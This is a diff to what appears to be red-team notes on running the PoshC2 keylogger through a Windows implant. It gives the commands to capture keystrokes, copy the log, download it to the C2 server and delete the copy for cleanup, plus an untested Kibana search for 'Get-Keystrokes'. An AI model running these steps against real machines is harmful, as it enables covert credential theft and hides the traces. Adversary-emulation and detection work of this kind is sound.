@@ -19,6 +19,7 @@ start-keystrokes-writefile
 
 copy "fileLocation(.log)" "Sameplace newname(.log)"
 #make a copy to download after the logger has been running
+## you cant download the original filelocation if the implant is still up. will get file in use error
 
 Download-file "path of newname.log" 
 ## Gets put into /var/poshc2/*projectname*/downloads
@@ -26,12 +27,13 @@ Download-file "path of newname.log"
 Stop-Keystrokes 
 ##Stop keylogger for cleanup
 
-posh-delete C:\<same place new filename> 
+posh-delete "path of newname.log"
 ##Cleaning up file created
 
-#you cant delete the original filelocation if the implant is still up. will get file in use error.
+##you cant delete the original filelocation if the implant is still up. will get file in use error.
 ```
 ---
 
 ## Detection Technique:
 * (Kibana): Utilized string searches. (“Get-Keystrokes”) --- NOT TESTED IN KIBANA
+* Detection has not been found
